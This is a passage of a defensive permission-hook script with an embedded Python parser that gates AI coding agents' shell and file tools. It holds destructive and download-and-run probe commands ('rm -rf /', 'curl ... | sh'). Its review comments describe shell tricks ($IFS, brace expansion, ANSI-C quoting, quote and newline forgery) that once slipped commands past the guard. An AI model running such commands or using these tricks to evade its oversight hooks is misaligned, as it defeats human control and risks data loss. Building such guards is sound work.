except OSError as err:
    sys.exit(refuse(f"this hook cannot read itself at {self_path!r} ({err})"))


def registered_hook(command):
    """(assignments, shell, hook path) of a registration this gate may run; refuses otherwise."""
    try:
        words = shlex.split(command)
    except ValueError as err:
        sys.exit(refuse(f"registration is not a shell word list ({err})"))
    assigns, i = {}, 0

    def take_assigns(i):
        while i < len(words) and ASSIGN_RE.fullmatch(words[i]):
            name, value = ASSIGN_RE.fullmatch(words[i]).groups()
            if name not in HOOK_ENV_KEYS:
                sys.exit(refuse(f"registration sets {name}, which the hook does not read — a "
                                "registration carries only the hook switches"))
            assigns[name] = value
            i += 1
        return i

    i = take_assigns(i)
    if words[i:i + 1] == ["env"]:
        i = take_assigns(i + 1)
    shell = None
    if i < len(words) and words[i].rsplit("/", 1)[-1] in SHELLS:
        shell = words[i]  # the whole token: an explicit path is run as registered (PR #707 review)
        i += 1
    rest = words[i:]
    if len(rest) != 1 or rest[0].rsplit("/", 1)[-1] != "deny-hook.sh":
        sys.exit(refuse("a registration is [VAR=value …] [sh] <path>/deny-hook.sh and nothing "
                        f"else; got {command!r}"))
    hook = Path(rest[0])
    if not hook.is_absolute():
        hook = Path(assigns.get("ORCA_UNIT_WORKTREE") or assigns.get("OPEN_FLEET_UNIT_WORKTREE")
                    or env.get("OPEN_FLEET_UNIT_WORKTREE") or env.get("ORCA_UNIT_WORKTREE")
                    or path.parent) / hook
    try:
        digest = hashlib.sha256(hook.resolve().read_bytes()).hexdigest()
    except OSError as err:
        sys.exit(refuse(f"the registered hook {rest[0]!r} cannot be read ({err})"))
    if digest != self_digest:
        sys.exit(refuse(f"the registered {rest[0]!r} is not this hook (its bytes differ from "
                        f"{self_path}); a registration may arm only the fleet's own deny-hook.sh"))
    return assigns, shell, str(hook)


registered_env = settings.get("env") if isinstance(settings, dict) else {}
registered_env = registered_env if isinstance(registered_env, dict) else {}
steering = sorted(k for k in registered_env if str(k) in STEERING)
if steering:
    sys.exit(refuse(f"the settings env sets {', '.join(steering)}, which would steer what the "
                    "probes execute; a registration env carries only the hook switches"))
# PASS_THROUGH values come from the coordinator process itself (never from a settings env block,
# which the discovery env above may have absorbed); the hook switches come from the discovery
# env: the coordinator's own, plus the ones the registration names.
probe_env = {k: v for k, v in os.environ.items() if k in PASS_THROUGH or k.startswith("LC_")}
probe_env.update({k: v for k, v in env.items() if k in HOOK_ENV_KEYS})
PROBE_ARGV = {}
for tool, command in sorted(commands.items()):
    assigns, shell, hook_path = registered_hook(command)
    if shell and "/" in shell:
        # An interpreter named by path: the probes must run THAT executable, and it must be one
        # no worker writes. Keeping only the basename let a registration name a shell inside the
        # worktree, pass the hook byte check, and be probed with the coordinator shell while the
        # harness later ran the worker one (PR #707 review).
        exe = os.path.realpath(shell)
        if not (os.path.isfile(exe) and os.access(exe, os.X_OK)):
            sys.exit(refuse(f"the registered shell {shell!r} is not an executable file"))
        fence = os.path.realpath(boundary_for(command))
        if exe == fence or exe.startswith(fence + "/"):
            sys.exit(refuse(f"the registered shell {shell!r} lies inside the worktree boundary "
                            f"{fence!r}; an interpreter the worker can write arms nothing"))
    else:
        exe = shutil.which(shell or "sh", path=os.environ.get("PATH"))
        if not exe:
            sys.exit(refuse(f"no {shell or 'sh'} on the coordinator PATH to run the probes with"))
    PROBE_ARGV[tool] = ([exe, hook_path], {**probe_env, **assigns})

if argv_mode:
    try:
        first = shlex.split(commands["Bash"])[0]
    except (ValueError, IndexError):
        first = ""
    if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", first):
        sys.exit(refuse("hermes runs hook commands without a shell, so a leading "
                        "VAR=value is not an assignment — spell it `env VAR=value sh …/deny-hook.sh`"))

# Probe shapes per harness: (shell tool, shell key, write tool, write input builder).
PROBES = {
    "claude": ("Bash", "command", "Edit", lambda p: {"file_path": p}),
    "generic": ("Bash", "command", "Edit", lambda p: {"file_path": p}),
    "codex": ("Bash", "command", "apply_patch",
              lambda p: {"command": f"*** Begin Patch\n*** Add File: {p}\n+x\n*** End Patch\n"}),
    "openhands": ("terminal", "command", "file_editor",
                  lambda p: {"command": "create", "path": p, "file_text": "x"}),
    "goose": ("shell", "command", "write", lambda p: {"path": p, "content": "x"}),
    "crush": ("bash", "command", "write", lambda p: {"file_path": p, "content": "x"}),
    "hermes": ("terminal", "command", "write_file", lambda p: {"path": p, "content": "x"}),
    "opencode": ("bash", "command", "write", lambda p: {"filePath": p, "content": "x"}),
    "omp": ("bash", "command", "edit", lambda p: {"path": p, "oldText": "a", "newText": "b"}),
    "pi": ("bash", "command", "edit", lambda p: {"path": p, "oldText": "a", "newText": "b"}),
    "jcode": ("bash", "command", "write", lambda p: {"file_path": p, "content": "x"}),
}
shell_tool, shell_key, write_tool, write_input = PROBES[harness]


def probe(command, tool_name, tool_input):
    """(decision, exit status) of the REGISTERED hook on one payload: the identified hook as an
    argv, under the scrubbed environment plus the registration's own assignments."""
    argv, penv = next(v for tool, v in PROBE_ARGV.items() if commands[tool] == command)
    penv = dict(penv)
    if harness == "jcode":
        payload = json.dumps(tool_input)
        penv["JCODE_HOOK_TOOL_NAME"] = tool_name
    else:
        event = "pre_tool_call" if harness == "hermes" else "PreToolUse"
        payload = json.dumps({"hook_event_name": event, "tool_name": tool_name,
                              "tool_input": tool_input})
    try:
        r = subprocess.run(argv, input=payload, capture_output=True, text=True, env=penv,
                           cwd=boundary_for(command), timeout=60)
    except (OSError, subprocess.SubprocessError) as err:
        return f"unrunnable:{err}", -1
    out = r.stdout.strip()
    if not out:
        dec = "allow" if r.returncode == 0 else ("deny" if r.returncode == 2 else f"error:{r.returncode}")
    else:
        try:
            doc = json.loads(out)
            dec = (doc.get("hookSpecificOutput") or {}).get("permissionDecision") or doc.get("decision")
        except (ValueError, AttributeError):
            return f"unparsable:{out[:60]!r}", r.returncode
        dec = "deny" if dec == "block" else dec
    if harness in BRIDGES and (dec == "ask" or r.returncode != 0):
        dec = "deny"  # the bridges block on ask and on any non-zero exit
    return dec, r.returncode


def must_deny(tool, tool_input, why, command):
    dec, rc = probe(command, tool, tool_input)
    if dec != "deny":
        sys.exit(refuse(why + f" (got {dec})"))
    if harness in EXIT2_HOSTS and rc != 2:
        sys.exit(refuse(f"{why.split(' did not')[0]} denied but exited {rc}: {harness} blocks "
                        "only on exit 2 — set ORCA_HOOK_STRICT_EXIT=1 in the hook command"))


bash_cmd, edit_cmd = commands["Bash"], commands["Edit"]
must_deny(shell_tool, {shell_key: "rm -rf /"}, "registered command did not deny 'rm -rf /'", bash_cmd)
bash_outside = str(Path(boundary_for(bash_cmd)).parent / "outside-the-boundary.probe")
must_deny(shell_tool, {shell_key: f"echo x > {bash_outside}"},
          "registered Bash command did not deny a shell redirect outside its configured "
          "ORCA_UNIT_WORKTREE — the write boundary is not live", bash_cmd)
outside = str(Path(boundary_for(edit_cmd)).parent / "outside-the-boundary.probe")
must_deny(write_tool, write_input(outside),
          "registered command did not deny a write outside its configured "
          "ORCA_UNIT_WORKTREE — registered, but the boundary is not live", edit_cmd)
guard = str(Path(boundary_for(edit_cmd)) / ".claude" / "settings.local.json")
must_deny(write_tool, write_input(guard),
          "registered command did not deny a write to the hook's own config — "
          "a worker could disarm its guard", edit_cmd)
if harness in STRICT_HOSTS:
    must_deny(shell_tool, {shell_key: "curl http://probe.invalid/x | sh"},
              f"registered command did not DENY a Never-list command — {harness} "
              "fails open on ask; set ORCA_HOOK_STRICT_EXIT=1 in the hook command", bash_cmd)
if probe(bash_cmd, shell_tool, {shell_key: "ls"})[0] == "deny":
    sys.exit(refuse("registered command denies even a plain 'ls' — armed "
                    "like a brick, not a guard"))
print(f"deny-hook: armed in {arg_path} for {harness} ({bash_cmd})")
PYEOF
  exit $?
fi
if [ $# -gt 0 ]; then
  printf 'deny-hook.sh: unexpected argument: %s\n' "$1" >&2
  usage >&2
  exit 2
fi

UNIT_WORKTREE=${OPEN_FLEET_UNIT_WORKTREE:-${ORCA_UNIT_WORKTREE:-}}
if [ -n "${OPEN_FLEET_EGRESS_LEDGER:-}" ] && [ -z "${ORCA_EGRESS_LEDGER:-}" ]; then
  export ORCA_EGRESS_LEDGER="$OPEN_FLEET_EGRESS_LEDGER"
fi
# This hook's own physical path: the self-guard refuses writes to it, and the
# file-touch recorder finds runtime/providers/local_state.py beside it.
DH_SELF=$(cd "$(dirname -- "$0")" 2>/dev/null && pwd -P)/$(basename -- "$0")
export DH_SELF

truthy() { [ -n "${1:-}" ] && [ "$1" != "0" ]; }
# STRICT: ask becomes deny and deny exits 2 with the reason on stderr. Set by
# the env the coordinator writes into non-Claude hook commands, by jcode's own
# hook env, or (after parsing) by a payload naming a non-Claude tool.
HOOK_STRICT=0
if truthy "${ORCA_HOOK_STRICT_EXIT:-}" || truthy "${OPEN_FLEET_HOOK_STRICT_EXIT:-}" \
  || truthy "${OPEN_FLEET_HOOK_EXIT2:-}" || [ -n "${JCODE_HOOK_TOOL_NAME:-}" ]; then
  HOOK_STRICT=1
fi
# READ-ONLY tier (W4-05). When OPEN_FLEET_HOOK_READONLY (or ORCA_HOOK_READONLY) is set, every
# write this hook can see is DENIED regardless of the boundary: the file tools, and a Bash
# redirect, tee or apply_patch in ANY command the line runs -- a -c body, a substitution, a
# program fed to a shell by a pipe, -s, a heredoc or a here-string. A shell reading a program on
# stdin that the hook cannot read (cat f | sh, sh < f, echo "$(cat f)" | sh) is denied too, and
# so is a body the hook cannot split: a write inside either would be unseen. This is the `ro`
# tier's defense-in-depth write floor -- plan-mode Bash still runs read-only shell (git
# diff/log, cat, ls, running tests). It is a write floor, NOT a filesystem sandbox: a mutation
# the hook does not model as a write record (cp/mv/rm without a redirect, a package install, an
# interpreter writing through its own API, a script already on disk run as sh f) is out of its
# reach, and the disposable sandbox is the real boundary for those (sandbox-policy.md).
HOOK_READONLY=0
if truthy "${OPEN_FLEET_HOOK_READONLY:-}" || truthy "${ORCA_HOOK_READONLY:-}"; then
  HOOK_READONLY=1
fi

# One decision object, with the reason JSON-encoded via argv (never interpolated).
decide() {
  _dec=$1
  _reason=$2
  if [ "$_dec" = "ask" ]; then
    if [ "$HOOK_STRICT" = "1" ] || truthy "${CODEX_CI:-}" || truthy "${CODEX_SANDBOX:-}" \
      || truthy "${OPEN_FLEET_HEADLESS_STRICT:-}"; then
      _dec="deny"
    fi
  fi
  _top_dec=$_dec
  if [ "$_dec" = "deny" ] && truthy "${GOOSE_MODE:-}"; then
    _top_dec="block"
  fi
  python3 -I -c 'import json,sys; print(json.dumps({"decision":sys.argv[3],"reason":sys.argv[2],"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":sys.argv[1],"permissionDecisionReason":sys.argv[2]}}))' "$_dec" "$_reason" "$_top_dec" 2>/dev/null || \
    printf '{"decision":"%s","reason":"denied by policy","hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":"denied by policy"}}\n' "$_top_dec" "$_dec"
  if [ "$_dec" = "deny" ] && [ "$HOOK_STRICT" = "1" ]; then
    printf '%s\n' "$_reason" >&2
    exit 2
  fi
}

PAYLOAD=$(cat 2>/dev/null || true)

# Extract tool_name, tool_input.command and tool_input.file_path as three lines.
# A parse failure (or no python3) exits non-zero here and DENIES below.
# The reader is larger than ONE argv or environment string may be on Linux
# (MAX_ARG_STRLEN, 128 KiB): handed over with python3 -c it could not start, so
# every request there was refused (PR #648 review PRRT_kwDOTWxN9c6v0TC6). It lives
# in this shell variable (never exported, so in no child environment) and reaches
# python3 on a pipe as its program (python3 -), with the payload on fd 3. No argv
# or env string carries either, and nothing is written to disk: a heredoc this
# size is a temp file under bash, which a read-only sandbox would refuse.
_READER='import fnmatch,json,os,re,shlex,sys
d = json.loads(open(3, encoding=sys.stdin.encoding, errors=sys.stdin.errors, closefd=False).read())
if not isinstance(d, dict):
    raise SystemExit(1)
raw_tool = d.get("tool_name") or d.get("tool") or os.environ.get("JCODE_HOOK_TOOL_NAME") or ""
# An event that names no tool cannot be judged as any tool: refused, never allowed as nothing
# (2026-10-29 audit, F7). A non-zero exit here is the unreadable-payload deny below.
if not raw_tool:
    raise SystemExit(1)
_ti_missing = False   # no tool_input of any shape: refused for a shell event below (F7)
ti = d.get("tool_input")
if isinstance(ti, str):
    try:
        parsed_ti = json.loads(ti)
        ti = parsed_ti if isinstance(parsed_ti, dict) else {"patch": ti, "input": ti}
    except Exception:
        ti = {"patch": ti, "input": ti}
elif not isinstance(ti, dict):
    if "tool_name" not in d and "tool" not in d and os.environ.get("JCODE_HOOK_TOOL_NAME"):
        ti = d
    elif isinstance(d.get("input"), dict):
        ti = d.get("input")
    else:
        ti, _ti_missing = {}, True
def s(v):
    return v.replace("\n", " ") if isinstance(v, str) else ""
def r(v):
    # The command as the shell sees it, newlines intact. `segments` needs them:
    # a newline separates two commands, and it is also the only thing that ENDS
    # a # comment. Pre-mapping it to `;` erased that boundary, so a comment had
    # no end to find (PR #325 review, P1).
    return v.replace("\r", "\n") if isinstance(v, str) else ""
def c(v):
    # The as-written Never-list pass reads this off a single line of the field
    # protocol, which cannot carry an embedded newline. In a shell a newline
    # SEPARATES two commands exactly as `;` does; flattening it to a space glued
    # them into one nonsense segment that matched nothing, so a two-line payload
    # walked straight past the HIGH tier (#297). Map it to the separator it
    # actually is. The splitter reads `r` instead and needs no such compromise.
    return r(v).replace("\n", " ; ")


# NOTE: this whole program is the argument of a single-quoted sh string, so it may not contain
# an apostrophe anywhere — not in code, not in a comment. SQ/DQ are how a quote character is
# named here. A stray one ends the sh string and the payload reader dies, which fails closed and
# refuses every tool call.
SQ = chr(39)
DQ = chr(34)
# What a shell splits words on. NOT str.isspace(): Python calls NBSP and friends
# whitespace, a shell does not, and a word boundary the shell never saw is one this
# parser must not invent either (PR #325 review, P1).
BLANKS = chr(32) + chr(9)
# A newline INSIDE a quoted word rides through the one-line records as this private-use
# character, never as a space: a `bash -c` or `trap` body with a newline in it is two
# commands, and flattening it to a space glued them into one that matched nothing (#598
# corpus). Records render it as a space (paths) or as \012 (comparison words).
_QNL = chr(0xE000)
# Marks where a command substitution sat in the surface text (substitution_bodies), numbered
# into _SUB_TEXTS so a head that IS a substitution can be read as what it prints (#598).
_SUB_MARK = "__orca_substitution__"
_SUB_TEXTS = []


def _sub_mark(body):
    _SUB_TEXTS.append(body)
    return _SUB_MARK + str(len(_SUB_TEXTS) - 1) + "_"


def _norm_join(sep_chars):
    # The join before a segment, reduced to what rule 5 (egress receipts)
    # needs: "&&" runs the next command only if the previous one succeeded;
    # every other separator run (||, ;, |, &, newline, mixes) runs it
    # regardless, so a receipt joined that way proves nothing about the send.
    # A lone pipe is told apart (#598): the command after it reads the one before
    # it on stdin, which is how echo CMD | sh runs CMD. |& is a pipe too (2>&1 |),
    # so echo CMD |& sh runs CMD as well (PR #648 review). Rule 5 reads it as "seq".
    core = sep_chars.replace(chr(10), "")
    if not core:
        return "start"
    if core in ("|", "|&"):
        return "|"
    if core == ";":
        return ";"   # a plain ; is seq too, told apart only to close a group (F8)
    return "&&" if core == "&&" else "seq"


def _split(cmd):
    """Split a shell line into (join, segment) pairs, QUOTE-AWARE.

    join is the operator run before the segment: "start" for the first,
    "&&" when the shell runs it only on the previous success, "seq" for
    every other separator. segments() below is this walk with the joins
    dropped, byte-identical to what it always returned.

    This was a sed pass over the raw text, and a separator inside a quoted string split there
    too. The header called that safe, reasoning that splitting only ever makes MORE segments and
    every segment is judged. That reasoning was wrong: the split leaves the rest of the quoted
    value glued to the FRONT of the next segment, and every HIGH-tier rule is anchored at ^.
    X=<dq>a&b<dq> git push --force origin main became `b<dq> git push --force origin main`, which
    begins with neither git nor anything else the tier knows, and was allowed (PR #308 review,
    P1). Same for ; and | inside a value.

    Quoting is parsed here rather than in sh because a POSIX shell cannot do it without eval, and
    python3 is already load-bearing above: no parser, no decision, and this whole script denies.
    Redirect operators are consumed whole so their | and & are never read as separators.

    A # that OPENS A WORD opens a comment, which runs to the end of its line. Nothing recognized
    them, so `git status # dont modify anything` was tokenized as shell: the apostrophe in the
    comment opened a quote that never closed, shlex raised, and the payload reader hard-DENIED a
    read-only command (PR #325 review, P1). Word position is what decides it, exactly as in a
    shell: after a redirect operator `>#f` names a file, and un-seeing that word would lose a
    write target, which is the one direction this parser must never fail in.
    """
    segs, cur = [], []
    cur_join, sep_run = "start", ""
    i, n, quote = 0, len(cmd), ""
    word_start = True
    # $<SQ>...<SQ> is ANSI-C quoting: a backslash escapes the next character, an escaped quote
    # among them, so the quote does not end where a plain single quote would (2026-10-23
    # review, P2-10). ansi marks that state; dollar marks an unquoted, unescaped $ just read.
    ansi = dollar = False
    while i < n:
        ch = cmd[i]
        was_dollar, dollar = dollar, False
        # A backslash-newline is a line continuation. The shell REMOVES it -- inside double
        # quotes as well as outside -- and the text on either side is one word. Keeping it opened
        # two holes (PR #325 review, P1): the newline rode into a word and broke the one-line
        # record protocol below, forging a C record that reset tee enforcement so the write
        # target after it went unchecked; and counting it as a word boundary made
        # echo a\<newline>#b a comment, swallowing the command after it. Removing it here leaves
        # word_start untouched, which is the point: a continuation neither opens nor closes a
        # word. Single quotes take no escapes, so it is literal there.
        if ch == "\\" and quote != SQ and i + 1 < n and cmd[i + 1] == "\n":
            i += 2
            continue
        if quote:
            # A literal newline inside a quoted word is data, not a boundary. It cannot travel on
            # the one-line record protocol below, so it rides as _QNL: a value, still one word.
            sep_run = ""
            cur.append(_QNL if ch == "\n" else ch)
            if ch == "\\" and (quote == DQ or ansi) and i + 1 < n:
                cur.append(_QNL if cmd[i + 1] == "\n" else cmd[i + 1])
                i += 2
                continue
            if ch == quote:
                quote, ansi = "", False
            word_start = False
            i += 1
            continue
        if ch == SQ or ch == DQ:
            quote, ansi = ch, ch == SQ and was_dollar
            sep_run = ""
            cur.append(ch)
            word_start = False
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            sep_run = ""
            cur.append(ch)
            cur.append(cmd[i + 1])
            word_start = False   # an escaped character is a word character
            i += 2
            continue
        if ch == "#" and word_start:
            while i < n and cmd[i] != "\n":
                i += 1
            continue   # the newline itself falls through to the separator case below
        if ch in "<>" or (ch == "&" and i + 1 < n and cmd[i + 1] == ">"):
            j = i + 1
            while j < n and cmd[j] in "<>|&":
                j += 1
            sep_run = ""
            cur.append(cmd[i:j])
            word_start = False
            i = j
            continue
        # && and || need no case of their own: the second character lands on a separator too, and
        # the empty segment between them is dropped below. Measured, not assumed — a mutant
        # removing a special case for them changed no decision, so there is no special case.
        # A newline is a separator too, and the one that ends a comment.
        if ch in ";|&\n":
            if cur:
                segs.append((cur_join, "".join(cur)))
                cur = []
            sep_run += ch
            cur_join = _norm_join(sep_run)
            word_start = True
            i += 1
            continue
        # Blanks BETWEEN segments (after an operator, before the next word —
        # or before the newline that ends a trailing comment) must not erase
        # the pending join: `receipt && # note` <newline> `send` is still
        # &&-joined (PR #567 review, P2).
        if ch not in BLANKS or "".join(cur).strip():
            sep_run = ""
        cur.append(ch)
        word_start = ch in BLANKS
        dollar = ch == "$"
        i += 1
    if cur:
        segs.append((cur_join, "".join(cur)))
    return [(join, seg) for join, seg in segs if seg.strip()]


def segments(cmd):
    return [seg for _join, seg in _split(cmd)]


def policy_word(word):
    # This is an internal comparison word, NEVER shell code. Encode whitespace,
    # quotes and escapes so shell word splitting cannot turn one operand into
    # flags/refspecs. Literal command/option words lose their shell quoting.
    word = word.replace(_QNL, chr(10))
    return "".join("\\%03o" % ord(ch) if ch.isspace() or ch in (SQ, DQ, "\\")
                   else ch for ch in word) or "\\000"


# An UNQUOTED $IFS expansion: $IFS, ${IFS}, ${IFS:0:1} and kin (W1-02, 2026-10-27 audit).
_IFS_EXPANSION = re.compile(r"[$](?:IFS(?![A-Za-z0-9_])|[{]IFS(?:[^A-Za-z0-9_}][^}]*)?[}])")


def shell_tokens(seg, with_fd=False, raw=False):
    # Keep operator identity BEFORE quote removal: quoted/escaped > is data.
    # A descriptor is optional and may have several digits. After an operator,
    # however, the next word is its target: in 10>&1>file, 1 is not another fd.
    # with_fd: every token carries a third item, the descriptor a redirection opens
    # (0 for <-forms, 1 for >-forms, "&" for &> and &>>; None for a word).
    # raw: a trailing item carrying the RAW (pre-unquote) slice, so a caller can tell a quoted
    # leading ~ from a live one (Codex g1 P2). A word split on $IFS carries the raw of each piece.
    ops = r"(?:&>>|&>|>>|>\||>&|<>|<<<|<<-|<<|<&|>|<)"
    i, target = 0, False
    while i < len(seg):
        if seg[i] in BLANKS:
            i += 1
            continue
        op = re.match(ops if target else r"[0-9]*" + ops, seg[i:])
        if op:
            name = op[0].lstrip("0123456789")
            if with_fd:
                num = op[0][:len(op[0]) - len(name)]
                fd = int(num) if num else ("&" if name[0] == "&" else int(name[0] == ">"))
                yield ("redirect", name, fd) + ((op[0],) if raw else ())
            else:
                yield ("redirect", name) + ((op[0],) if raw else ())
            i += len(op[0])
            target = True
            continue
        start, quote, ansi, dollar = i, "", False, False
        # An unquoted $IFS expansion is field-split by the shell exactly like a blank:
        # rm$IFS-rf$IFS/ runs rm with -rf and /. Read as one word, every argument stayed inside
        # the head and each refused head was judged bare (W1-02). Inside quotes it is one word.
        cuts = []
        while i < len(seg):
            ch = seg[i]
            if ch == "\\" and (quote != SQ or ansi):
                i += 2
                dollar = False
                continue
            if quote:
                if ch == quote:
                    quote, ansi = "", False
            elif ch in (SQ, DQ):
                quote, ansi = ch, ch == SQ and dollar
            elif ch in BLANKS or ch in "<>&":
                break
            elif ch == "$" and _IFS_EXPANSION.match(seg, i):
                end = _IFS_EXPANSION.match(seg, i).end()
                cuts.append((i, end))
                i, dollar = end, False
                continue
            dollar = not quote and ch == "$"
            i += 1
        if i == start:
            raise ValueError("unexpected operator")
        edges = [start] + [x for cut in cuts for x in cut] + [i]
        pieces = [seg[edges[k]:edges[k + 1]] for k in range(0, len(edges), 2)]
        for piece in [pc for pc in pieces if pc] or [seg[start:i]]:
            yield ("word", _unquote(piece)) + ((None,) if with_fd else ()) + ((piece,) if raw else ())
        target = False


# Escapes the shell decodes inside $<SQ>...<SQ>. A decoded newline rides as _QNL and a CR as a
# space: a record is one line, and a word is still one word (the same rule _split applies).
_ANSI_C = {"a": chr(7), "b": chr(8), "e": chr(27), "E": chr(27), "f": chr(12), "n": _QNL,
           "r": " ", "t": chr(9), "v": chr(11), "\\": "\\", SQ: SQ, DQ: DQ, "?": "?"}


def _ansi_c(text, j):
    # Decode an ANSI-C quoted body from j (just past the opening quote) to its closing quote:
    # (decoded text, index after the quote). shlex knows no $<SQ>...<SQ>, so it kept the escapes
    # literal and $<SQ>\x72m<SQ> -rf / was judged a command named $\x72m, while bash and zsh run
    # rm (2026-10-23 review, P2-10). A NUL ends the string in the shell, so it ends it here.
    out, cut, n = [], False, len(text)
    while j < n:
        ch = text[j]
        if ch == SQ:
            return "".join(out), j + 1
        val, step = ch, 1
        if ch == "\\" and j + 1 < n:
            nxt, step = text[j + 1], 2
            m = None
            if nxt in _ANSI_C:
                val = _ANSI_C[nxt]
            elif nxt in "01234567":
                m = re.match(r"[0-7]{1,3}", text[j + 1:])
                val, step = chr(int(m[0], 8) & 255), 1 + len(m[0])
            elif nxt in "xuU":
                m = re.match(r"[0-9A-Fa-f]{1,%d}" % {"x": 2, "u": 4, "U": 8}[nxt], text[j + 2:])
                if m:
                    code = int(m[0], 16)
                    val, step = (chr(code) if code < 0x110000 else "?"), 2 + len(m[0])
                else:
                    val = ch + nxt
            elif nxt == "c" and j + 2 < n:
                val, step = chr(ord(text[j + 2]) & 31), 3
            else:
                val = ch + nxt   # an unknown escape keeps its backslash
        if val == chr(0):
            cut = True
        if not cut:
            out.append(val.replace(chr(10), _QNL).replace(chr(13), " "))
        j += step
    raise ValueError("unclosed ANSI-C quote")


def _unquote(text):
    """One shell word, quote-removed the way the shell does it, ANSI-C and $DQ...DQ included."""
    out, i, n, quote = [], 0, len(text), ""
    while i < n:
        ch = text[i]
        if quote == SQ:
            quote = "" if ch == SQ else quote
        elif quote == DQ:
            if ch == "\\" and i + 1 < n:
                # The shell drops the backslash of \$ and of an escaped backtick inside double
                # quotes; shlex keeps it. A body sh -c runs is read as the shell hands it over:
                # sh -c "rm\${IFS}-rf\${IFS}/" holds a live $IFS (W1-02).
                out.append(text[i + 1] if text[i + 1] in "$" + chr(96) else text[i:i + 2])
                i += 2
                continue
            quote = "" if ch == DQ else quote
        elif ch == "\\" and i + 1 < n:
            out.append(text[i:i + 2])
            i += 2
            continue
        elif ch == "$" and text[i + 1:i + 2] == SQ:
            body, i = _ansi_c(text, i + 2)
            out.append(SQ + body.replace(SQ, SQ + "\\" + SQ + SQ) + SQ)
            continue
        elif ch == "$" and text[i + 1:i + 2] == DQ:
            i += 1   # $DQ...DQ is a double-quoted string (a locale lookup at most)
            continue
        elif ch in (SQ, DQ):
            quote = ch
        out.append(ch)
        i += 1
    return shlex.split("".join(out))[0]


def record(kind, value):
    # One record, one line. A value carrying a newline forges the NEXT record, and a forged
    # C line resets tee enforcement so the write target after it is never checked (PR #325
    # review, P1). segments() makes this unreachable -- an unquoted newline separates, a
    # quoted one rides as a space, a continuation is removed -- so anything arriving here
    # means that reasoning is wrong somewhere, and dying is the fail-closed answer.
    if "\n" in value or "\r" in value:
        raise ValueError("a record value cannot contain a newline")
    print(kind + " " + value.replace(_QNL, " "))


SHELL_TOOLS = ("Bash", "bash", "shell", "terminal", "exec_command", "execute_bash",
               "developer__shell", "local_shell")
EDITOR_TOOLS = ("file_editor", "str_replace_editor", "text_editor", "developer__text_editor")
if raw_tool in SHELL_TOOLS:
    norm_tool = "Bash"
elif raw_tool in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
    norm_tool = raw_tool
elif raw_tool in ("write", "edit", "multiedit", "replace", "write_file", "apply_patch", "patch",
                  "hashline_edit", "create_file"):
    norm_tool = "Edit"
elif raw_tool in EDITOR_TOOLS:
    fe_cmd = str(ti.get("command") or "").strip().lower()
    norm_tool = "Read" if fe_cmd == "view" else "Edit"
else:
    norm_tool = str(raw_tool)


def _argv_line(argv):
    """The command line a shell command sent as an argv list spells (Codex local_shell sends
    command as [bash, -lc, LINE]): [sh, -c, LINE] is LINE, any other list is its words joined
    with shell quoting (2026-10-29 audit, F7). A word that is not a string is refused."""
    if not all(isinstance(w, str) for w in argv):
        raise SystemExit(1)
    if len(argv) >= 3 and argv[0].rsplit("/", 1)[-1] in ("sh", "bash", "zsh", "dash", "ksh",
                                                         "mksh", "ash", "yash", "posh", "hush") \
            and re.fullmatch(r"-[A-Za-z]*c[A-Za-z]*", argv[1]):
        return argv[2]
    return shlex.join(argv)


# A shell event with no tool_input, or a command that is neither a string nor an argv list, is
# refused rather than read as an empty command (2026-10-29 audit, F7). An EMPTY tool_input runs
# nothing and stays allowed.
if norm_tool == "Bash":
    if _ti_missing:
        raise SystemExit(1)
    for _ck in ("command", "cmd"):
        if isinstance(ti.get(_ck), list):
            ti[_ck] = _argv_line(ti[_ck])
        elif _ck in ti and not isinstance(ti[_ck], str):
            raise SystemExit(1)
# STRICT when the payload names a tool Claude Code never sends: Claude tool names are
# PascalCase, every other audited host uses snake/lowercase names (#577). Those hosts
# either fail open on ask (Codex) or read only exit 2 / decision block (Hermes, jcode).
STRICT_TOOLS = set(SHELL_TOOLS[1:]) | set(EDITOR_TOOLS) | {"apply_patch", "patch", "write_file"}
strict_payload = bool(raw_tool) and (raw_tool in STRICT_TOOLS or raw_tool[:1].islower())

# --- brace expansion (2026-10-26 review) ------------------------------------------------------
# bash expands {a,b} and {1..3} BEFORE every other expansion, so `git push --force{,} origin main`
# runs `git push --force --force origin main` while every rule here read one opaque word
# `--force{,}` and ALLOWED the push (`rm -rf /{,}` fell from a HIGH deny to a never-list ask the
# same way). The command text is expanded here once, the way bash does it: unquoted braces only,
# `${` opens a parameter expansion and is left alone, nothing expands between [[ and ]], and a
# word with no unquoted comma and no valid sequence stays as written (find -exec {} is untouched).
# Everything downstream -- the records, the HIGH tier, the never list -- reads the expanded words.
# The words one word can expand to are capped; past the cap the word is unreadable and the
# command is refused (a D record), never read as the one word it is not.
_BRACE_CAP = 512
_BRACE_TOTAL = 4096
_BRACE_SEPS = chr(10) + ";|&()<>" + chr(96)
_BRACE_WORD_LEADS = "#;|&()<>" + chr(96)
_SEQ_INT = re.compile(r"^(-?[0-9]+)\.\.(-?[0-9]+)(?:\.\.(-?[0-9]+))?$")
_SEQ_CHR = re.compile(r"^([A-Za-z])\.\.([A-Za-z])(?:\.\.(-?[0-9]+))?$")


def _skip_param(word, i):
    # i at the { of a ${: the index just past its matching }, quotes and nesting respected.
    depth, j, n, quote = 0, i, len(word), ""
    while j < n:
        ch = word[j]
        if ch == "\\" and quote != SQ:
            j += 2
            continue
        if quote:
            if ch == quote:
                quote = ""
        elif ch in (SQ, DQ):
            quote = ch
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return j + 1
        j += 1
    return n


def _seq_items(body):
    # The words of a {x..y[..step]} sequence, or None when body is not one.
    m = _SEQ_INT.match(body)
    if m:
        lo, hi = int(m[1]), int(m[2])
        step = abs(int(m[3])) if m[3] and int(m[3]) else 1
        step = step if lo <= hi else -step
        if abs(hi - lo) // abs(step) + 1 > _BRACE_CAP:
            raise ValueError("a sequence longer than %d words" % _BRACE_CAP)
        width = 0
        if any(len(x.lstrip("-")) > 1 and x.lstrip("-").startswith("0") for x in (m[1], m[2])):
            width = max(len(m[1]), len(m[2]))
        out = []
        for v in range(lo, hi + (1 if step > 0 else -1), step):
            out.append(str(v).zfill(width) if v >= 0 else "-" + str(-v).zfill(max(width - 1, 0)))
        return out
    m = _SEQ_CHR.match(body)
    if m:
        lo, hi = ord(m[1]), ord(m[2])
